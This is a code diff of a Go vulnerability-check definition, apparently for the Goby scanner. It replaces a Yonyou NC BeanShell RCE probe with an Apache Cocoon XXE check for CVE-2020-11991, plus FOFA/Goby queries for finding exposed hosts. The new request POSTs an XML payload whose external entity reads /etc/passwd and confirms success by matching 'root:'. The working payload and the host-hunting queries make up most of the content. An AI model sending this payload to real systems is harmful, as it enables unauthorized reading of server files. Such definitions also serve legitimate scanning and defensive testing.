@@ -6,15 +6,15 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "用友NC BeanShell RCE",
+  "Name": "Apache Cocoon XML注入 CVE-2020-11991",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "GobyQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "Level": "3",
+  "FofaQuery": "app=\"Apache-Cocoon\" || product=\"Apache-Cocoon\"",
+  "GobyQuery": "app=\"Apache-Cocoon\" || product=\"Apache-Cocoon\"",
+  "Level": "2",
   "Impact": "",
   "Recommendation": "",
   "References": [],
@@ -29,12 +29,14 @@ func init() {
     "AND",
     {
       "Request": {
-        "method": "GET",
-        "uri": "/servlet/~ic/bsh.servlet.BshServlet",
+        "method": "POST",
+        "uri": "/v2/api/product/manger/getInfo",
         "follow_redirect": true,
-        "header": {},
+        "header": {
+          "Content-type": "text/xml"
+        },
         "data_type": "text",
-        "data": ""
+        "data": "<!--?xml version=\"1.0\" ?-->\n<!DOCTYPE replace [<!ENTITY ent SYSTEM \"file:///etc/passwd\"> ]>\n<userInfo>\n<firstName>John</firstName> \n<lastName>&ent;</lastName>\n</userInfo>"
       },
       "ResponseTest": {
         "type": "group",
@@ -51,7 +53,7 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "BeanShell",
+            "value": "root:",
             "bz": ""
           }
         ]
@@ -107,7 +109,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "用友NC BeanShell RCE",
+      "Name": "Apache Cocoon XML注入 CVE-2020-11991",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +118,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "yonyou NC BeanShell RCE",
+      "Name": "Apache Cocoon XML injection CVE-2020-11991",
       "Product": "",
       "Description": "",
       "Recommendation": "",
